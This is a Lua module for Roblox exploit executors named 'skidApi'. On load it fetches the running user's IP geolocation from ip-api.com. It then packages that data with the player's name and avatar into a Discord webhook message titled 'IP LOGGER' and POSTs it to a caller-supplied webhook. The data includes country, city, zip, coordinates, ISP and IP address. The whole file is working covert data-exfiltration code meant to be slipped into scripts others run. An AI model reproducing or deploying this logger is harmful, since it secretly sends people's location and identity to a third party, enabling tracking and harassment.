do
    -- This function returns a string with the name of the exploit u using(only checks for krnl, synapse, script ware)
    local function checkExploit()
        
        local exploitName = (syn and 'Synapse') or (Krnl and 'Krnl') or ( identifyexecutor and identifyexecutor() ) or (getexecutorname and getexecutorname())


        return exploitName

    end

    skidApi = {
        webhookJson = function(self, scriptName)

            if not self then return end

            local player = game.Players.LocalPlayer
            local playerThumb = string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=420&y=420&userid=%d&format=png', player.UserId)
            local ipData = self.ipApi
            scriptName = scriptName or 'EZ'
            return {
                content = string.format('**@%s** __fired__ **%s**', player.Name, scriptName),
                embeds  = {
                    { 
                        author={
                                name='Logger',
                                url='https://discord.gg/gmJQNxbKpZ',
                                icon_url='https://cdn.discordapp.com/attachments/874435126778552414/874436606793252935/804211903676940288.png'
                        },
                        title='Imagine **IP LOGGER**',
                        url='https://discord.gg/q8FspVseAU',
                        description = string.format('@%s**(%s)** fired **%s** [discord](https://discord.gg/gmJQNxbKpZ)', player.Name, player.DisplayName, scriptName),
                        color = 0,
                        fields  = {
                            {
                                name = '**Country**',
                                value = ipData['country'] .. '/' .. ipData['countryCode'],
                                inline = true
                            },
                            {
                                name = '**Region**',
                                value = ipData['regionName'] .. '/' .. ipData['region'],
                                inline = true
                            },
                            {
                                name = '**City/Zip**',
                                value = ipData['city'] .. '/' .. ipData['zip'],
                                inline = true
                            }
                        },
                        thumbnail = {
                            url = playerThumb
                        }
                    },
                    {
                        color = 0,
                        fields={
                            {
                                name = '**lat/lon**',
                                value = ipData['lat'] .. '/' .. ipData['lon'],
                                inline = true
                            },
                            {
                                name = '**Isp/Org**',
                                value = ipData['isp'] .. '/' .. ipData['org'],
                                inline = true
                            },
                            {
                                name = '**IPV4/IPV6**',
                                value = ipData['query'],
                                inline = false
                            },
                        },
                        footer = {
                            text = 'Here',
                            icon_url='https://cdn.discordapp.com/emojis/762821024592691221.png?v=1'
                        }
                    }
                }
            }
        end,
        ipApi = game:GetService('HttpService'):JSONDecode(game:HttpGet('http://ip-api.com/json')),
        exploitName = checkExploit(),

        httpPost = (Krnl and request) or (syn and syn.request) or http_request or (http and http.request),
        
        sendWebhook = function(self,webhooklink, ...)
            if self and webhooklink and self.httpPost and self.webhookJson then

                if type(self.webhookJson) == "function" then
                    return self.httpPost(
                    {
                        Url = webhooklink,
                        Method = 'POST',
                        Body = game:GetService('HttpService'):JSONEncode(self:webhookJson(...)) ,
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        }
                    }
                )
                end

                return self.httpPost(
                    {
                        Url = webhooklink,
                        Method = 'POST',
                        Body = game:GetService('HttpService'):JSONEncode(self.webhookJson) ,
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        }
                    }
                )
            end
        end
    }

end








return skidApi
